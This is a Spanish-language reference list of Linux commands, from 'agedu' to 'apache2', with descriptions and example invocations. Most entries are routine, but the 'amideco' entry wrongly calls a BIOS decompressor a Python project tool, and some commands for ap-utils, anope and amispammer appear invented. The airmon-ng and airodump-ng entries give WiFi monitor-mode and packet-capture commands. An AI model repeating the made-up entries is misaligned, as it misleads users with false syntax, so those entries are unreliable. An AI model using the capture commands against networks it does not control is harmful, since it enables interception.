Escanea directorios e informa de la cantidad de datos.
$ agedu -s .
$ agedu -s /var/www/html
$ agedu -s /var/www/html -w (abrir el informe en el navegador)


agetty
[linux-util]. Alternativa a getty. Abre un puerto tty, pide un nombre de usuario e invoca el comando /bin/login. Es un programa que se ejecuta en una computadora host que administra terminales físicos o virtuales para permitir el acceso de múltiples usuarios. Tiene algunas características no-estandar que son útiles para líneas de cable y líneas telefónicas.
$ agetty 9600 ttyS1
$ agetty -8 – linux (opciones para tty de 8 bits, '-' la entrada estándar ya está conectada a una tty y 'linux' es el valor de la variable de entorno TERM)
$ agetty -8 -t 5 linux (tiempo de espera del proceso de inicio de sesión 5 segundos)
$ agetty --local-line 9600 ttyS1 vt100
$ agetty --extract-baud --timeout 60 ttyS1 9600,2400,1200 (Para una línea de marcación de estilo antiguo con un módem de 9600/2400/1200 baudios)
$ agetty --wait-cr --init-string 'ATE0Q1&D2&C1S0=1\015' 115200 ttyS1 (Para un módem Hayes con una interfaz fija de 115200 bps a la máquina. La cadena de inicio de ejemplo desactiva el eco del módem y los códigos de resultado, hace que el módem/computadora rastree el módem/módem DCD, hace que una caída de DTR cause una desconexión y activa la respuesta automática después de 1 pitido)
$ agetty --list-speeds (muestra las velocidades en baudios admitidas)


aggrhome
Lector de feeds RSS que muestra las portadas de los principales agregadores de noticias en español. La página carga automáticamente los feeds RSS de varios sitios, muestra el primer artículo de cada feed y permite actualizar la información de manera periódica según un intervalo configurable. Descarga e instalación:
$ git clone https://github.com/enterum/aggrhome.git (descargar)
$ cd aggrhome (entrar en el directorio)
$ npm install (instalar dependencias)
$ npm run build (compilar)
$ npm run start (iniciar el servidor local)
Y en el navegador se abre la página http://127.0.0.1:5500/. Los feeds en aggrhome/docs/feeds.txt


aha
Lee el texto de entrada, lo convierte a HTML en color y lo escribe en la salida.
$ echo q | htop | aha -b -l > htop.html (Cree un archivo HTML con un fondo negro a partir de la salida de htop. La opción -l anula otros comandos de nueva línea que usa htop)
$ man age | aha -b -t 'manual de age' -y 'font-size:1.875em' > aha-age.html (con fondo negro, especificando título y una fuente concreta)
$ ls -al --color=force | aha --pink > ls.htm (ls coloreado y pasado a html)


aide
Sistema de detección de intrusos. No evita la intrusión, sólo informa que esta se ha producido y qué archivos fueron modificados. La primera vez que se ejecuta, crea una base de datos con los atributos, usuarios, permisos... de los archivos especificados aplicándoles una o varias funciones hash por lo que el mejor momento para instalar esta aplicación es con un sistema recien instalado.
# aide -i (Crear la base de datos. Al iniciar por  primera vez y evitar: Couldn't open file /var/lib/aide/please-dont-call-aide-without-parameters/aide.db.new for writing)
# aide -u (Actualizar la base de datos)
# aide -c (Hacer un chequeo del sistema para comprobar modificaciones)
	Nota.- Los archivos de configuración: /etc/aide/aide.conf.d/, /etc/aide/aide.conf y /etc/default/aide


airmon
[aircrack-ng]. Utilidad que coloca la tarjeta de red en modo monitor.
# airmon-ng start wlan0 (Iniciar el modo monitor)
# airmon-ng stop wlan0 (Finalizarlo)
# airmon-ng start wlan0 5 (Eespecificando un canal)
	Nota.- Confirmar que la tarjeta está en modo monitor con iwconfig.


airodump
[aircrack-ng]. Escaneo wifi y captura de paquetes. Previamente la tarjeta tiene que estar en modo monitor [ver airmon].
# airodump-ng mon0 (Escanear redes disponibles. Para con Ctrl + c)
# airodump-ng -c 8 --bssid BSSID –w captura.cap mon0 (que guarde las capturas del canal 8 de la dirección MAC [BSSID] en el archivo "captura.cap" de la interfaz de red mon0)


ajaxplorer
Crear un owncloud [tipo dropbox] en local. Una vez instalado:
# cp /usr/share/doc/ajaxplorer/apache2.sample.conf /etc/apache2/sites-enabled/ajaxplorer.conf
Reiniciar apache:
# service apache2 restart
Aceder con http://localhost/ajaxplorer y, como primer paso, modificar la contraseña por defecto [admin/admin]


ajaxterm
Proporciona una shell web por un puerto dado aceptando peticiones del mismo equipo desde el navegador.
$ ajaxterm -d (Lanza como demonio, colocando el puerto 8022 [si no se ha modificado] a la escucha)
Se accede en local colocando en la barra del navegador: http://localhost:8022
$ ajaxterm -p 12500 (Modificando el puerto por defecto)
1.-
Modificar las medidas de la terminal:
# nano /usr/share/ajaxterm/ajaxterm.py
Modificar la linea con las medidas escogidas:
	def __init__(self,width=150,height=60):
# nano /usr/share/ajaxterm/ajaxterm.html
	t=ajaxterm.Terminal("term",150,60);


akregator
Lector RSS.
Teclas de control:
	Ctrl + r (Marcar fuente como leida)
	Ctrl + q (Salir de la aplicación)
	Ctrl + l (Obtener todas las fuentes)
	Ctrl + w (Cerrar pestaña)
	- (Articulo previo sin leer)
	+ (Articulo siguiente sin leer)
	F2 (Editar la fuente)
	F5 (Obtener la fuente)
	p (Fuente anterior)
	n (Fuente posterior)
	Ctrl + Mayus + r (Marcar todas las fuentes como leidas)
	Ctrl + Mayus + return (Abrir noticia en el navegador externo)
	Mayus + return (Abrir noticia en una pestaña)


alacritty
Emulador de terminal que utiliza GPU para realizar su trabajo. Un archivo de configuración puede ser <https://gitlab.com/dwt1/dotfiles/-/raw/master/.config/alacritty/alacritty.yml> y puede copiarse en ~/.alacritty. Puede descargarse de <https://github.com/alacritty/alacritty/releases>


alarm-clock-applet
Reloj despertador que se situa en el área de notificación. Admite alarmas múltiples y repetibles, así como función de repetición y un sistema de notificación flexible. Se admiten dos tipos de alarmas: despertadores y temporizadores. La notificación se realiza reproduciendo un sonido o lanzando una aplicación
$ alarm-clock-applet (coloca el applet en el area de notificación)


album
Crear una galeria de imagenes. En la carpeta de las imagenes:
$ album
Carpeta de temas en /usr/share/album/Themes/ pero es preferible copiarla en el directorio raiz del directorio web:
$ cp -R /usr/share/album/Themes /var/www/.Themes
$ album -theme Stars fotos/ (Usando el tema especificado con el directorio “fotos”. Listado en /usr/share/album/Themes/)
$ album -columns 3 fotos/ (que la página principal tenga un terminado número de columnas con las imágenes)
$ album -charset=UTF-8 fotos/ (Especificar codificación de caracteres)
Para agregar pies de foto , crear el archivo captions.txt en el directorio y con el siguiente esquema:
$ nano fotos/captions.txt
foto1.jpg [una_tabulación] Texto
foto2.jpg [una_tabulación] Texto
foto3.jpg [una_tabulación] Texto
Si deseamos esconder una foto, la comentamos [#] en captions.txt.
Crear el archivo header.txt en el directorio con un texto:
$ nano fotos/header.txt
Fotos vacaciones en la playa
Agregar un final de página (footer):
$ nano fotos/footer.txt
Imágenes libre
Cualquier modificación de archivos o directorios implica actualizar la aplicación:
$ album fotos/


alias
Permite que una cadena de palabras sea sustituida por una más corta.
$ alias ls='ls --color=auto' (Cuando se teclee "ls" se ejecutará su equivalencia)
$ \ls (si "ls" es un alias se ejcutarà sin serlo [ver nota])
# unalias ls  (suprimir el alias)
$ alias (listado de alias activos)
Nota.- Para ejecutar un comando que coincida con un alias pero sin su equivalencia, además de precedirlo con una barra invertida [\] usando como ejemplo el mismo alias ls mencionado, tambien puede hacerse:
$ "ls"
$ 'ls'
$ command ls
$ /usr/bin/ls


alien
Convertir formatos de distintas distribuciones.
$ alien --to-deb paquete (convertir a .deb)
$ alien  --to-rpm paquete (a .rpm)
$ alien  --to-tgz paquete (a .tgs)
$ alien -i  --to-deb paquete   (convertirá “paquete” y lo instalará)


alpine
Gestor de correo. Antes de proseguir, si queremos que nos guarde la contraseña del correo crear el archivo:
$ touch .pine-passfile
La primera vez que lo lancemos creará el archivo .pinerc y mostrará un mensaje al que pulsaremos "intro" para entrar en el menú principal. Seleccionar "setup" y C. Del montón de parámetros que pueden personalizarse, sólo son imprescindibles 4:
"Personal name" [Shift + c para editarlo y en la parte inferior aparecerá el editor con el cursor parpadeando] Entramos el nombre del correo:
usuario@correo.com [intro]
"User Domain". Lo editamos [Shft + c] y colocamos:
	correo.com [intro]
(gmail.com, gmx.es.... según se trate)
	"SMTP Server". [Shft + c] y entramos:
	smtp.correo.com:587/tls/novalidate-cert/user=usuario@correo.com [intro]
	"Inbox Path". [Shft + c] y ponemos:
	{pop.correo.com/pop3/ssl/novalidate-cert/user=usuario@correo.com}INBOX
Intro y para salir de la configuración pulsar:
	Shift + e
Preguntará si se salvan los datos. Pulsar "y" y regresamos al menú. Para entrar en el correo, seleccionar "FOLDER LIST" Preguntará la contraseña y si queremos guardarla [lo hace en el archivo .pine-passfile]
En "COMPOSE MESSAGE" se entran los correos separados por "," en el apartado Cc [copia oculta] o To. Ctrl + x para enviar.


alsa-info
Información sobre los dispositivos alsa.
$ alsa-info


alsa-utils
[Advanced Linux Sound Architecture]. Modulo del nucleo de Linux que sustituye diferentes controladores de targetas de sonido con un solo dispositivo de controlador el cual tiene la capacidad de controlar diversas targetas. Incluye las siguientes herramientas: alsactl [controles avanzados para controladores de sonido ALSA], alsaloop [crea loopbacks entre dispositivos de captura y reproducción PCM], alsamixer [mezclador de curses], alsaucm [administrador de casos de uso de alsa], amixer [mezclador de línea de comandos], amidi [lee y escribe en puertos RawMIDI de ALSA], aplay [reproducción], arecord [grabación], aplaymidi [reproducción], arecordmidi [grabación de MIDI], aconnect, aseqnet, aseqdump [control de secuenciador MIDI], iecset [establece o descarga bits de estado IEC958] y speakers-test [generador de tonos de prueba de altavoces]


alsabat
Probador de sonido para controlador de tarjeta de sonido alsa.
$ alsabat (básico)
$ alsabat -P plughw:0,0 -C plughw:0,0 --file 500Hz.wav
$ alsabat -P plughw:0,0 -C plughw:0,0 -c 2 -f S32_LE -F 250


alsabat-test
Testeo de la tarjeta de sonido
$ alsabat-test


alsactl
Se usa para controlar la configuración avanzada de los controladores de la tarjeta de sonido ALSA.
# alsactl store (guarda el estado del controlador actual para la tarjeta de sonido seleccionada en el archivo de configuración)
# alsactl restore (carga el estado del controlador para la tarjeta de sonido seleccionada desde el archivo de configuración)


alsaloop
Permite crear un bucle de retorno PCM entre un dispositivo de captura de PCM y un dispositivo de reproducción de PCM.
$ alsaloop -C hw:0,0 -P hw:1,0 -t 50000


alsamixer
Mezclador de tarjeta de sonido para el controlador ALSA
$ alsamixer
$ alsamixer -V all (ver todas las opciones de salida)
1.-
Guardar la configuración del volumen:
# nano /etc/pulse/default.pa
Comentar, como se muestra, la linea:
#load-module module-device-restore


alsaucm
Permite a las aplicaciones acceder al hardware de forma abstracta
$ alsaucm -n listcards (no abrir la primera tarjeta encontrada [-n] y enumerar las tarjetas disponibles)
$ alsaucm -n reload (releer la configuración)
$ alsaucm -n reset (restablecer la tarjeta de sonido al estado predeterminado)


altavoz
Apagar el altavoz interno del pc
# gedit /etc/modprobe.d/blacklist
Y añadiremos la linea:
	blacklist pcspkr


amideco
Herramienta que se utiliza para crear y gestionar proyectos de desarrollo de software en Python
$ amideco create /project (crear un proyecto)
Entrar en el directorio y en él:
$ amideco run (iniciar un servidor local)
$ amideco install requests (instalar dependencias)
$ amideco update (actualizar dependencias)
$ amideco test (ejecutar pruebas)
$ amideco docs generate (generar documentación)
$ amideco nfig set ENVIRONMENT_VARIABLE=value (configurar variables de entorno)
$ amideco cache clear (limpiar caché)


amidi
Relativo a los dispositivos midi.
$ amidi -l     (listar los dispositivos MIDI de ALSA-utils)


amispammer
Herramienta que se utiliza para analizar archivos de registros de correo electrónico y detectar patrones de comportamiento que puedan indicar actividad de spam o comprobar si una o más direcciones IP o todos los registros de dominios MX aparecen en las listas negras más importantes.
$ amispammer -f /archivo.log (analizar un archivo de registro de correos)
$ amispammer -f /archivo.log -t 100 (que marque las direcciones IP que hayan enviado al menos 100 mensajes)
$ amispammer -f /archivo.log -i 60 (buscará actividad de spam dentro del último período de 60 minutos en los registros)
$ amispammer -f /archivo.log -o /reporte.txt (generar un reporte detallado en un archivo)
$ amispammer -f /archivo.log -v (obtener más detalles)
$ amispammer -f /archivo.log --exclude 192.168.1.1 (ignorar direcciones IP específicas conocidas y confiables)
Supongamos un ejemplo completo en el que se quiere analizar el archivo /var/log/mail.log para detectar IPs que enviaron más de 50 mensajes en los últimos 120 minutos, guardando el resultado en un archivo de reporte y excluyendo una IP específica:
$ amispammer -f /var/log/mail.log -t 50 -i 120 -o /var/log/reporte_spam.txt --exclude 203.0.113.5 -v


amixer
Control del volumen.
$ amixer set Master 50%-   (Bajar un 50% del volumen)
$ amixer set Master 30%+  (Sube un 30% el volumen)
$ amixer -D pulse set Master 50% (establece Pulseaudio como dispositivo predeterminado
$ amixer set Master mute (silenciar)
$ amixer set Master unmute (no silenciar)


ample
Servidor MP3 simple escrito en C que no admite mezclas, programas de radio, etc, solo está pensado para ser una manera fácil de escuchar de forma remota MP3.
$ ample -p 8080 -d /musica/mp3 (reproducir los archivos de la carpeta mp3 en http://localhost:8080 o con http://IP:8080)


amtterm
Herramienta utilizada para interactuar con dispositivos que soportan la tecnología Intel AMT [Active Management Technology] la cual está diseñada principalmente para permitir la gestión remota de computadoras, incluso cuando el sistema operativo no está funcionando o si la máquina está apagada o fuera de banda [out-of-band - OOB]. Esto es posible gracias a que Intel AMT se encuentra integrado en el hardware de la placa base y el adaptador de red, lo que permite acceder y gestionar la máquina de manera remota a través de una interfaz pseudoserie similar a un puerto serial, pero usando la red. La herramienta utiliza el protocolo SOL [Serial Over LAN] para establecer una sesión de terminal remota sobre la red. Incluye amttool un script para recopilar información sobre las computadoras administradas por AMT y controlarlas remotamente.
$ amtterm -H 192.168.1.100 -u admin -p 123456 (dirección IP de la máquina con Intel AMT habilitado, usuario y contraseña)
$ amtterm -H 192.168.1.100 -u admin -p 123456 -P 16993 (por un puerto personalizado el 16993)


an
Generar anagramas para una palabra o frase proporcionada por el usuario.
$ an -c 'lin' 'genial' (que empiece por las letras "lin" contenidas en "genial")
$ an -l 4 'linux' (limitando el número de anagramas a los de máximo 4 palabras o silabas)
$ an -m 3 'juan gomez' (solo poner grupos de palabras de 3 letres)


anacron
Puede utilizarse para ejecutar comandos periódicamente, con una frecuencia especificada en días.  A diferencia de cron [ver], no asume que la máquina esté funcionando continuamente.  Por lo tanto, puede usarse en máquinas que no funcionan 24 horas al día, para controlar tareas diarias, semanales y mensuales que normalmente se usa cron. Si cuando ha llevarse a cabo la tarea la máquina está apagada, la próxima vez que sea iniciada esperara los minutos especificados en "delay" y realizara la tarea indicada sin esperar al día siguiente. En el archivo de configuración /etc/anacrontab se han de specificar las tareas con el siguiente esquema: periodo_tarea retardo_ejecución identificador comando
    periodad_tarea: frecuencia con la cual se realizará la tarea: @daily o 1 [diario], @weekly o 7 [semanal],  @monthly o 30 [mensual] o 50 [cada 50 dias]
    retarde_ejecución: Indica la cantidad de minutos antes de ser ejecutada la tarea.
    identificador: Nombre que damos a la tarea.
    Comando: Comando o script que será ejecutado.
En el archivo /etc/anacrontab, si debajo de LOGNAME= root añadimos START_HOURS_RANGE=23-6, entonces los trabajos únicamente se ejecutarán entre las 23 de la noche y las 6 de la madrugada. Otra opción es añadir el parámetro RANDOM_DELAY=15 que lo que hará este parámetro es añadir un retardo aleatorio adicional de 0 a 15 minutos a cada una de las tareas que se van a ejecutar para repartir mejor la carga del sistema.
# anacron -f (forzar la ejecución de las tareas, igorando las marcas de tiempo)
# anacron -u ( actualiza las marcas de tiempo de los trabajos, a la fecha actual, pero no ejecuta nada)
# anacron -n (Ejecute las tareas ahora, ignorando cualquier retraso)
# anacron -d -s (realizar las tareas ahora de forma secuenciada, primero las diarias, luego las semanales y al final las mensuales)
# cat /var/spool/anacron/cron.daily (consultar la fecha en que se ejecutaron la totalidad de scripts guardados en, por ejemplo, cron.daily, igual para  cron.monthly y cron.weekly)
Ejemplo de bakup semanal:
# nano /etc/anacrontab
Y colocar la linea:
  7 5 backup.semanal /bin/bash /home/user/bin/backup.sh
Significa que cada 7 dias, 5 minutos arriba o abajo y con el nombre backup.semanal se lanzando el script backup.sh ejecutado por bash.


analog
Procesador de archivos de registro rápido que genera informes y estadísticas de uso de servidores web. Puede procesar millones de líneas por minuto, escalable, flexible, salida en HTML, maneja muchos formatos de archivos de registro y, además de por linea de comandos, puede utilizar una interfaz web.
# analog +Oanalog.html ([letra "o" mayuscula y justo a continuación el nombre] Genera el informe "analog.html")
# analog (Muestra la salida por consola)


anarchism
Historia del anarquismo en inglés. Acceder al contenido mediante el navegador.
file:///usr/share/doc/anarchism/html/index.html


anamnesis
Gestor del portapapeles. Almacena el historial del portapapeles y ofrece una interfaz para hacer búsquedas de todo lo copiado. Descarga de: <http://sourceforge.net/projects/anamnesis/> Una	vez descomprimido copiar la carpeta en:
    # cp anamnesis-1.0.4 /usr/local/
Colocar	el ejecutable en el path:
    # ln -s	/usr/local/anemnesis-1.0.4/source/anemnesis.py /usr/bin/anemnesis
$ anamnesis --start (Arrancar sesión. Otras opciones: restart, stop)
$ anamnesis -b (Ver el historial. Con intro o cambiando de escritorio desaparece)
$ anamnesis -l 3 (Mostrar los últimos 3 datos guardados)
$ anamnesis -l 5 --filter="palabra" (Buscar en los últimos 5 datos el que contine "palabra")
$ anamnesis -a "Historial del Portapapeles" (Ponerle un título)
$ anamnesis --remove = 5 (Eliminar el registro del ID número 5)


and
Demonio automático que se activa en ciertos intervalos y renueva los trabajos según su prioridad y uso de CPU. Archivo de configuración en /etc/and.conf
$ systemctl status and.service (saber si estñá activo)


anillo-de-claves
Suprimir el “desbloquear anillo de claves”
$ rm -Rf .gnome2/keyrings/login.keyring
# killall gnome-keyring-daemon  (matar el demonio)


animate
[imagemagick]. visualizar gif.
$ animate vuelo.gif


anonip
Comando útil para anonimizar direcciones IP en registros, enmascarando los últimos bits de direcciones IPv4 e IPv6.
# anonip -f /var/log/auth.log (procesará todas las direcciones IP en el archivo especificado, enmascarando los últimos bits y anonimizando las direcciones)
# anonip -f /var/log/auth.log -4 8 (dejar las direcciones IPv4 con los últimos 8 bits enmascarados, como 192.168.1.0)
# anonip -f /var/log/auth.log -6 32 (enmascarar los últimos 32 bits de las direcciones IPv6)
# cat /var/log/auth.log | anonip (enmascarar las direcciones IP de la salida del comando cat directamente en la consola)
# anonip -f /var/log/auth.log -o /var/log/auth_anonimizado.log (anonimizar y guardar en un archivo de salida)
# anonip -f /var/log/auth.log -v (ver más detalles del proceso mientras se ejecuta)
Un ejemplo completo sería anonimizar un archivo de registro /var/log/apache2/access.log, enmascarando los últimos 16 bits de las direcciones IPv4 y los últimos 48 bits de las direcciones IPv6, y guardando el resultado en un archivo de salida anonimizando todas las IPs que encuentre:
# anonip -f /var/log/apache2/access.log -4 16 -6 48 -o /var/log/apache2/access_anonimizado.log -v


anon-proxy
Navegación anónima via proxy. los archivos de configuración en /etc/efault/anon-proxy.
# /etc/init.d/anon-proxy start (Arrancar el proxy)
Configurar el navegador con localhost y el puerto 4001


anope
Conjunto de servicios diseñado para facilitar la administración de redes IRC [Internet Relay Chat], proporcionando herramientas para gestionar canales, usuarios y permisos.
# anope --services (iniciar en modo servicios para una red IRC)
# anope --debug (ver información detallada del funcionamiento)
        /msg NickServ REGISTER <password> <email> (registrar el nick actual bajo tu cuenta)
        /msg ChanServ REGISTER #canal <password> <descripción> (asigna el control del canal especificado)
        /msg BotServ ASSIGN #canal <botname> (asignar bots a canales y administrar acciones automáticas)
        /msg OperServ STATS (verificar el estado de la red incluyendo conexiones y actividad reciente)


ansi2html
[colorized-logs]. Pasar textos a html.
# ansi2html -w </var/log/apache2/access.log >acces.html (con el fondo blanco)


ansi2txt
[colorized-logs]. Guardar logs a txt.
# ansi2txt </var/log/apache2/access.log >acces.txt


ansible
Sistema de ejecución de tareas remotas, implementación de múltiples nodos y administración de configuración basada en modelos radicalmente simples. Ansible funciona a través de SSH y no requiere que se instale ningún software ni daemon en los nodos remotos. Los módulos de extensión se pueden escribir en cualquier lenguaje y se transfieren a las máquinas administradas automáticamente. Este paquete contiene las colecciones de Ansible: ansible-config, ansible-console, ansible-galaxy, ansible-playbook, ansible-test, ansible-community, ansible-connection, ansible-doc, ansible-inventory, ansible-pull y ansible-vault.
$ ansible-config list (lista todas las opciones de configuración junto con sus valores predeterminados)
$ ansible-config dump --only-changed (muestra solo las configuraciones modificadas respecto a los valores predeterminados)
$ ansible-console -i inventory.yml (abre una consola interactiva con el inventario especificado en inventory.yml, permitiéndo ejecutar comandos directamente)
$ ansible-galaxy install USER.nginx (instala el rol nginx del usuario USER)
$ ansible-galaxy list (muestra los roles y colecciones instalados en el sistema)
$ ansible-playbook playbook.yml --syntax-check (revisa la sintaxis del playbook para asegurar que no haya errores antes de ejecutarlo)
$ ansible-test sanity (ejecuta pruebas de validación estática sobre los módulos y roles definidos)
$ ansible-community init project_name (crea la estructura de carpetas estándar para un nuevo proyecto)
$ ansible-doc apt (muestra la documentación completa del módulo apt)
$ ansible-doc -l (lista todos los módulos disponibles, con una breve descripción de cada uno)
$ ansible-inventory -i inventory.yml --list (muestra el inventario en un formato JSON, útil para validar su configuracion)
$ ansible-pull -U https://github.com/user/repo.git playbook.yml (clona el repositorio especificado de Git y ejecuta playbook.yml en el nodo local
$ ansible-vault create secrets.yml (crear un archivo secrets.yml cifrado, solicitando una contraseña para protegerlo)
$ ansible-vault edit secrets.yml (abrir el archivo secrets.yml para editarlo, solicitando la contraseña configurada)
ansible-connection es un plugin de conexión interna que, generalmente, no se usa directamente sinó que se configura en el archivo de inventario con la linea:
                   server1 ansible_connection=ssh


ansilove
Herramienta útil para convertir archivos de texto en formato ANSI o ASCII a imágenes PNG.
$ ansilove texto.txt -o text.png (tomar el contenido del archivo input.txt que debe estar en formato ANSI y lo convertirá a una imagen PNG)
$ ansilove -f cp737 -m ced input.txt -o output.png (con la fuente cp737 y negro sobre gris, con 78 columnas.)
$ ansilove -i input.txt -o output.png (activar color)


ansiweather
Mostrar información actual de las condiciones meteorológicas, con soporte para colores ANSI y símbolos Unicode. Los datos meteorológicos provienen de OpenWeatherMap
$ ansiweather -l "Olot,ES" -u metric (forma básica)
$ ansiweather -l "Olot,ES" -u metric -s true -f 5 -d true (mostrando pequeños simbolos, luz diurna y previsión para los próximos 5 dias)
$ ansiweather -l "Olot,ES" -u metric -s true -d true -w true -h true (mostrando, viento, luz diurna, humedad, presión, hora amanecer, hora puesta)
Para personalizar la ciudad, traducción y datos concretos para no tener que entrarlos cada vez, bajar el archivo https://github.com/fcambus/ansiweather/blob/master/ansiweatherrc.example y colocarlo como ~/.ansiweather.
   $ cat .ansiweather
   location:Olot,ES
   units:metric
   ...
   humidity_text:Humedad
   pressure_text:Presión
   sunrise_text:Salida
   ...


ant
Herramienta de automatización para proyectos Java que permite compilar, construir y gestionar dependencias a través de archivos XML llamados build.xml.
$ ant (ejecutar una tarea Predeterminada definida en el archivo build.xml)
$ ant compile (si en build.xml existen varias tareas definidas, ejecutar la llamada "compile")
Un archivo build.xml básico para compilar un proyecto podría verse así:
   <project name="miProyecto" default="compile" basedir=".">
       <target name="compile">
               <mkdir dir="build/classes"/>
               <javac srcdir="src" destdir="build/classes"/>
       </target>
   </project>
Esto compilará el código Java desde el directorio src y pondrá los archivos .class en build/classes. Para eliminar archivos temporales y carpetas de compilación previas, se puede definir una tarea clean:
     <target name="clean">
         <delete dir="build/classes"/>
     </target>
Y luego ejecutarla:
$ ant clean
Para empaquetar el proyecto en un archivo JAR, se puede agregar una tarea jar:
     <target name="jar" depends="compile">
         <mkdir dir="build/jar"/>
         <jar destfile="build/jar/miProyecto.jar" basedir="build/classes"/>
     </target>
Y ejecutarla:
$ ant jar
que generará el archivo miProyecto.jar en el directorio build/jar.


antiword
Conversor/lector de archivos .doc
$ antiword archivo.doc | less (Visualiza un doc)
$ antiword -p A4 archivo.doc > archivo.ps (Convierte a ps)
$ antiword -t -w 25 archivo.doc > archivo.txt (Convierte a txt)
Algunas opciones:
	-p (Formato PostScript. 10x14, A3, A4, A5, B4, B5, ejecutivo, folio...)
	-a (Formato Adobe. 10x14, A3, A4, A5, B4, B5, ejecutivo, folio...)
	-t (Salida en forma de texto con formato: negrita, subrayado...)
	-w (Anchura del texto)


anytopnm
convierte la imagen de entrada, que puede estar en cualquiera de los aproximadamente 100 formatos gráficos, a formato PBM, PGM o PPM, dependiendo de la propia naturaleza de la imagen de entrada.
$ anytopnm imagen.jpeg > imagen


anytun
Implementación del protocolo de tunelización segura anycast. Utiliza una interfaz de estilo openvpn y permite construir clústeres de VPN redundantes con equilibrio de carga entre servidores. Incluye las herramientas anytun-config, anytun-controld y anytun-showtables.
# anytun -D -u USER (iniciar un túnel VPN, que se ejecute en primer plano en lugar de convertirse en un demonio [predeterminada] y se ejecuta como USER)
# anytun --local-port 5000 --remote 192.168.1.1 --remote-port 5001 --shared-secret "clave_compartida" (crea un túnel VPN con puerto local 5000, el remoto 192.168.1.1 en el 5001 y clave compartida para la autenticación)
# anytun-config --shared-secret "clave" > anytun.conf (genera un archivo de configuración con la clave compartida y guarda el resultado en anytun.conf)
# anytun-controld --stop --id IP (detiene el túnel identificado con la IP)
# anytun-showtables (mostrar la configuración actual de rutas y las conexiones activas del túnel)


aoeui
Editor de pantalla muy pequeño y eficiente.
$ aoeui -r file.txt (abrir solo lectura)
$ aoeui -s -u file.txt (usar espacios, no tabulaciones, para la sangría automática y tratar file.txt como UTF-8 incluso si contienen codificaciones UTF-8 no válidas)
$ aoeui -t 6 script (establecer la tabulación en 6)
Algunas teclas de control con el editor abierto:
        Ctrl g (ir al princio de la linea)
        Ctrl c (ir al final de la linea)
        Ctrl espacio Ctrl g (ir al principio del párrafo. Si ya está allí, vuelve al principio del párrafo anterior)
        Ctrl espacio Ctrl c (ir al final del párrafo. Si ya está allí, vuelve añ principio del párrafo anterior)
        Ctrl l (mueve la ventana hacia adelante en pantallas completas)
        Ctrl r (mueve la ventana hacia atrás en pantallas completas)
        Ctrl espacio Ctrl r (ir al principio del texto)
        Ctrl espacio Ctrl l (ir al final del texto)
        Ctrl k (con varios textos abiertos, guarda todos los textos modificados)
        Ctrl v (inicia selección. Una vez seleccionado otra vez con "Crtl v" se anula la selección)
        Ctrl d (corta selección)
        Ctrl b (pega selección)
        Ctrl u (deshacer el último comando)
        Ctrl q (salir sin guardar)
        Ctrl espacio Ctrl q (guardar y salir)


aosd_cat
Herramienta de visualización en pantalla. Se puede utilizar para notificaciones en scripts de shell. El archivo "prueba.txt" del ejemplo solo tiene el texto "linux es un sistema genial".
$ aosd_cat -p 3 -R red -S green -u 10000 -f 3000 -o 3000 -a 10 -e 5 -n "Open Sans Extrabold" -i prueba.txt
Opciones de geometría:
         -p, --position (posición en la ventana. El rango válido es de 0 a 8, donde 0 es la esquina superior izquierda y 8 es la esquina inferior derecha. El valor predeterminado es 6)
         -x, --x-offset (desplazamiento de la ventana del eje x desde el punto (0,0). Predeterminado es 50)
         -y, --y-offset (desplazamiento de la ventana del eje y desde el punto (0,0). Predeterminado es -50)
         -e, --shadow-offset (desplazamiento de la sombra. Predeterminado es 2)
         -d, --padding (margen desde el borde hasta el contenido. Predeterminado es 0)
Opciones de apariencia:
         -t, --transparency (modo de transparencia. 0=ninguno, 1=falso, 2=compuesto. Predeterminado es 2)
         -n, --font (fuente. No hay valor predeterminado)
         -w, --width (ancho de ajuste en píxeles. cero, ajustará al ancho de la pantalla o no se ajustará si otros parámetros lo hacen imposible. Predeterminado es 0)
Opciones de coloración:
         -B, --back-color (color de fondo. No hay valor predeterminado)
         -S, --shadow-color (color de la sombra. Predeterminado negro)
         -R, --fore-color (color del primer plano. predeterminado verde)
Opciones de opacidad:
         -b, --back-opacity (opacidad del fondo. Predeterminado es 0)
         -s, --shadow-opacity (opacidad de las sombras. Predeterminado es 192)
         -r, --fore-opacity (opacidad del primer plano. Predeterminado es 255)
Opciones de tiempo:
         -f, --fade-in (tiempo de entrada gradual. Predeterminado es 300)
         -u, --fade-full (tiempo para mostrar con opacidad completa. Predeterminado es 3000)
         -o, --fade-out (tiempo de salida gradual. Predeterminado es 300)
Opciones de desplazamiento hacia atrás:
         -a, --age (límite de eliminación de la antigüedad de las líneas. Predeterminado es 0)
         -l, --lines (límite de eliminación de la cantidad de líneas. Predeterminado es 1)
Opciones de la aplicación:
         -i, --input (fuente del texto de entrada. Predeterminado es -)


aoss
[espeak, alsa-oss, mbrola]. Para que la consola hable.
$ aoss espeak --voices   (ver las opciones idiomáticas)
$ aoss espeak --voices=es (ver las variantes de un idioma)
$ aoss espeak -v es+whisper -p30 linux,es,un,sistema,genial
$ aoss espeak -v es+f4 -p30 “linux es un sistema genial”  (lo mismo entre comillas)
$ aoss espeak -v es+m2 -f archivo.txt  (lee de un archivo txt)
$ aoss espeak -v es -s50 -w archivo.wav "linux es un sistema genial" (Crear un wav)
Opciones:
	-v en (para que hable en inglés)
	-s110 (variar velocidad de dicción. A número más alto, más velocidad)
	-p90 (tesitura de voz. De 0 a 99. Valor alto: agudos. Por defecto 50)
	-a50 (Volumen de salida. De 0 a 200. Por defecto 100)
	-g15 (Silencio entre palabras. Por defecto 10 milisegundo)
	-v es+croak [m1,m2,m3,m4,m5,m6 y whisper] (opciones de voz masculinas)
	-v es+f1 [f2,f3 yf4]  (opciones de voz femeninas)


ap-utils
Conjunto de utilidades para la administración de puntos de acceso inalámbricos.
# ap-auth --ip 192.168.1.1 --user USER --password "PASSW" (autentifica en el punto de acceso con dirección IP 192.168.1.1 usando las credenciales de usuario y contraseña especificadas.)
# ap-config --ip 192.168.1.1 --set-channel 6 (cambia el canal del punto de acceso con dirección IP 192.168.1.1 al canal 6)
# ap-gl --ip 192.168.1.1 (muestra el estado del AP con dirección IP 192.168.1.1, incluyendo el estado de la red, dispositivos conectados y otras métricas relevantes)
# ap-telnet --ip 192.168.1.1 --user USER --password "PASSW" (iniciar una sesión telnet en el punto de acceso)


apache2
Ajustes de apache2
# apache2ctl -M    (Visualizar todos los modulos de apache)
# apache2ctl -S (visualizar el estatus de apache)
# apache2ctl -t  (Comprobar que la configuracion de apache va bien)
# apache2ctl -k graceful  (Reiniciar sin cortar las conexiones de los usuarios)
